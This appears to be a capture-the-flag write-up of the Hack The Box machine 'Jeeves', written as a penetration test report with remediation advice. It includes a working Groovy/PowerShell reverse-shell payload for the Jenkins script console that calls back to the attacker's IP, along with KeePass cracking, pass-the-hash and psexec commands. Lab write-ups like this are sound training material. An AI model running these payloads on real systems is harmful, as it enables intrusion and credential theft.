
+++
title = "Jeeves-CPTS-Prep-Box Writeups"
date = 2026-02-17T00:00:00Z
draft = false
description = "Jeeves is a Windows machine focusing on Jenkins exploitation, KeePass password cracking, and NTFS alternate data stream (ADS) enumeration for privilege escalation"
tags = ["CPTS", "HTB", "Jeeves", "CPTS Prep", "Active Directory", "Jenkins", "ADS"]
+++
## Executive Summary
During October 2025, a simulated penetration test was conducted against the Windows host "Jeeves" (`10.129.32.123`). The objective was to evaluate the security posture of the target and identify potential escalation paths to achieve SYSTEM-level privileges.
The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to full system compromise. The following key findings were identified:
- **Jenkins Instance Exposure:** A Jenkins service running on port 50000 was discovered, accessible without authentication. This exposed an attack surface for remote code execution.
- **Jenkins Script Console Exploitation:** The Jenkins script console was leveraged to execute a Groovy reverse shell payload, providing initial access to the target system under the context of the user `kohsuke`.
- **Sensitive Data Discovery:** During enumeration of the user's home directory, a KeePass database file (`CEH.kdbx`) was identified and exfiltrated for offline analysis.
- **Credential Extraction:** The KeePass database master password was successfully cracked, revealing stored credentials including an NTLM hash that authenticated as the built-in `Administrator` account.
- **NTFS Alternate Data Stream (ADS) Bypass:** Upon gaining administrative access, it was discovered that the root flag was concealed within an alternate data stream (`hm.txt:root.txt:$DATA`), requiring enumeration of NTFS ADS to retrieve the final flag.
**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to achieve SYSTEM-level privileges by exploiting a misconfigured Jenkins instance, cracking a weakly protected KeePass database, and leveraging stored administrative credentials.
**Recommendations:**
- **Restrict Jenkins Access:** The Jenkins instance should not be exposed on network ports without proper authentication. Implement network segmentation or require authentication for the script console.
- **Secure Credential Storage:** KeePass databases should be protected with strong, complex master passwords that resist cracking attempts. Consider implementing additional factors for vault access.
- **Principle of Least Privilege:** The Jenkins service should run with the minimum necessary privileges, not under a user context with access to sensitive files.
- **Monitor for ADS Usage:** Implement file integrity monitoring that can detect and alert on the use of alternate data streams, which are often used for data hiding.
## About
Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.
## Detailed Walkthrough
### Phase 1: Initial Access and Network Reconnaissance
**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services. The scan revealed several open ports, including HTTP on port 80, SMB on port 445, and an unidentified service on port 50000. Further investigation determined the host was running Windows with IIS web server.

```bash
# Nmap 7.94SVN scan initiated Thu Oct 30 16:02:59 2025 as: nmap -sVC -p- -oN nmap_Allport-Jeeves-30.10.2025.txt 10.129.32.123
Nmap scan report for 10.129.32.123
Host is up (0.083s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc?
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  ibm-db2?
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-30T14:06:41
|_  start_date: 2025-10-30T13:57:23
|_clock-skew: mean: 4h59m57s, deviation: 2s, median: 4h59m55s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 30 16:07:21 2025 -- 1 IP address (1 host up) scanned in 261.82 seconds
```
**Findings:** The target was identified as a Windows host named `JEEVES` with an IIS web server hosting a search application called "Ask Jeeves". The service on port 50000 was later identified as a Jenkins instance, accessible via the `/askjeeves` endpoint.

### Phase 2: Web Application and Jenkins Enumeration

**2. Web Application Analysis**  
The web application on port 80 presented a search interface. Testing revealed that input was reflected back to the user, but no immediate vulnerabilities were identified.

**3. Jenkins Discovery and Enumeration**  
Further enumeration of the service on port 50000 revealed a Jenkins continuous integration server. Directory fuzzing identified the `/askjeeves` endpoint, which redirected to the Jenkins dashboard. Notably, the Jenkins instance was accessible without any authentication requirements.

![[port-80-of-the-host.png]]

``Putting 'TEST'
![[after-putting-test.png]]

```bash
 ffuf -u http://10.129.228.112:50000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.112:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
```

**Findings:** The Jenkins instance was completely open, allowing any unauthenticated user to view jobs, configurations, and—critically—access administrative features such as the script console.

### Phase 3: Initial Foothold via Jenkins Script Console

**4. Groovy Script Exploitation**  
Jenkins provides a Groovy script console that allows administrators to execute arbitrary code on the server. With no authentication required, this feature presented a direct path to remote code execution. A Groovy script was crafted to execute a PowerShell reverse shell payload, establishing a connection back to the attacker machine.
```bash
curl -I http://10.129.228.112:50000/askjeeves/script
HTTP/1.1 200 OK
Date: Fri, 31 Oct 2025 13:21:00 GMT
X-Content-Type-Options: nosniff
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache,no-store,must-revalidate
X-Hudson-Theme: default
Content-Type: text/html;charset=utf-8
Set-Cookie: JSESSIONID.aa15473a=node0nsad3qkvinrnv3tu4bz52jc51.node0;Path=/askjeeves;HttpOnly
X-Hudson: 1.395
X-Jenkins: 2.87
X-Jenkins-Session: 17d6623c
X-Frame-Options: sameorigin
X-Instance-Identity: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjXy89esjjFa1jFYBzOZ6fPraR12bi8eK4JPv/cryrGiTmtcjmSXDj+oId01Fk66HvJCLubWVDe5L1iEjIimwLPqCP9txsXn6oceMKYZNbHfNwx673GgrHoJN6gpLl78UGPip5On/hgmUp2fWJ4aDvvFK5/mRaUH9ypMu5RyjKDhGMtsXc4BGgwa1EerSxc1EylBb/j1DvZoQRLIe8OM/n9s/6HnKzu5LYXvHPgKgPyaiE/eLsgwTmYrwldW6nFOE1xzBWnoAcLKmNi4IpjErrSYvRVA+v/K7CHxY8bncrSdQXCQtx4ayOjJW1d50GTQOEwcjo8WqUPe7u9+aM6F78wIDAQAB
Content-Length: 12077
Server: Jetty(9.4.z-SNAPSHOT)
```

![[test-payload-groovyscript.png]]


**5. Reverse Shell Payload Execution**  
The following Groovy script was executed in the Jenkins script console to establish a reverse shell connection:
```bash 
def sout = new StringBuffer(), serr = new StringBuffer()
def cmd = "cmd.exe /c powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.14', 443); \$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush() }\""
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
println "out> $sout err> $serr"
```

![[Reverse-shell.png]]

### Phase 4: Post-Exploitation and Lateral Movement

**6. Establishing Persistence**  
The reverse shell payload executed successfully, providing an interactive shell on the target system under the context of the `kohsuke` user. Initial reconnaissance confirmed the user's home directory and the location of the `user.txt` flag.

**7. User Flag Retrieval**  
Navigation to the `kohsuke` user's Desktop revealed the `user.txt` flag, confirming successful initial compromise and providing the first objective flag.

```powershell
PS C:\Users\Administrator\.jenkins> cd ../../
PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/3/2017  11:07 PM                Administrator
d-----        11/5/2017   9:17 PM                DefaultAppPool
d-----        11/3/2017  11:19 PM                kohsuke
d-r---       10/25/2017   4:46 PM                Public


PS C:\Users> cd kohsuke
PS C:\Users\kohsuke> ls


    Directory: C:\Users\kohsuke


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/3/2017  10:51 PM                .groovy
d-r---        11/3/2017  11:15 PM                Contacts
d-r---        11/3/2017  11:19 PM                Desktop
d-r---        11/3/2017  11:18 PM                Documents
d-r---        11/3/2017  11:15 PM                Downloads
d-r---        11/3/2017  11:15 PM                Favorites
d-r---        11/3/2017  11:22 PM                Links
d-r---        11/3/2017  11:15 PM                Music
d-r---        11/3/2017  11:22 PM                OneDrive
d-r---        11/4/2017   3:10 AM                Pictures
d-r---        11/3/2017  11:15 PM                Saved Games
d-r---        11/3/2017  11:16 PM                Searches
d-r---        11/3/2017  11:15 PM                Videos


PS C:\Users\kohsuke> cd Desktop
PS C:\Users\kohsuke\Desktop> ls


    Directory: C:\Users\kohsuke\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/3/2017  11:22 PM             32 user.txt


PS C:\Users\kohsuke\Desktop> cat user.txt
<REDACTED> 
PS C:\Users\kohsuke\Desktop>

```

**8. Sensitive Data Discovery**  
Further enumeration of the user's directories uncovered a KeePass database file (`CEH.kdbx`) located in the Documents folder. This file was identified as a potential source of stored credentials and was exfiltrated to the attacker machine for offline analysis.
```Powershell
PS C:\Users\kohsuke\Documents> ls


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx


PS C:\Users\kohsuke\Documents>

```

**9. KeePass Password Cracking**  
The KeePass database was processed using KeePass2John to extract a hash suitable for password cracking. The hash was successfully cracked, revealing the master password. This allowed full access to the contents of the KeePass vault.
```bash
❯ john keepassCEH.txt --show
CEH:<REDACTED> 

1 password hash cracked, 0 left
```

![[keepassxc.png]]
**Findings:** The KeePass database contained various entries, including an entry with an NTLM hash that appeared to be associated with the built-in Administrator account. The hash was extracted for testing.

```bash
aad3b435b51404eeaad3b435b51404ee:<REDACTED> 
```

### Phase 5: Privilege Escalation to SYSTEM

**10. Administrator Hash Validation**  
The extracted NTLM hash was tested against the target system using SMB authentication. The hash successfully authenticated as the `Administrator` account, confirming that the stored credentials were valid for the local administrator.

```bash
netexec smb 10.129.228.112 -u administrator -H <REDACED>
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Error checking if user is admin on 10.129.228.112: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\administrator:<REDACTED> 

```

**11. Remote Code Execution as SYSTEM**  
With valid administrator credentials, the PsExec utility was used to execute commands on the target system with SYSTEM-level privileges. This provided a high-integrity shell and complete control over the host.
```bash
❯ psexec.py Administrator@10.129.228.112 -hashes :<REDACTED> 

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.228.112.....
[*] Found writable share ADMIN$
[*] Uploading file LcbctOdW.exe
[*] Opening SVCManager on 10.129.228.112.....
[*] Creating service gBXy on 10.129.228.112.....
[*] Starting service gBXy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


```


### Phase 6: Root Flag Retrieval and Alternate Data Streams

**12. Root Flag Enumeration**  
Navigating to the Administrator's Desktop revealed a file named `hm.txt`, but the expected `root.txt` flag was not immediately visible. Directory listing with alternate data stream enumeration enabled revealed that the flag was hidden within an NTFS alternate data stream.

```bash
 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,647,101,440 bytes free

c:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,647,101,440 bytes free

c:\Users\Administrator\Desktop> more < hm.txt:root.txt:$DATA
<REDACTED> 

c:\Users\Administrator\Desktop>

```

**13. ADS Flag Extraction**  
The flag was stored as `hm.txt:root.txt:$DATA`, a hidden stream attached to the visible `hm.txt` file. Using the `more` command to read the stream, the `root.txt` flag was successfully retrieved, completing the objective.

```powershell

more < hm.txt:root.txt:$DATA
```

**Findings:** The root flag was concealed using NTFS alternate data streams, a common technique for hiding data on Windows systems that requires specific enumeration methods to detect.
## Key Takeaways
- **Jenkins Security:** Always secure Jenkins instances, especially the script console, which provides trivial RCE.
- **Password Management:** KeePass databases are only as secure as their master password; weak passwords can be cracked.
- **Data Hiding:** Alternate data streams provide a mechanism for hiding data on NTFS filesystems and should be included in enumeration checks.
- **Credential Reuse:** Stored credentials in password managers may provide escalation paths if they belong to higher-privileged accounts.
## Tools Used
- **Nmap** - Network enumeration
- **FFUF** - Directory fuzzing
- **Jenkins Groovy Console** - Initial code execution
- **KeePass2John / John the Ripper** - Password cracking
- **NetExec** - Hash validation
- **Impacket (PsExec)** - Remote code execution
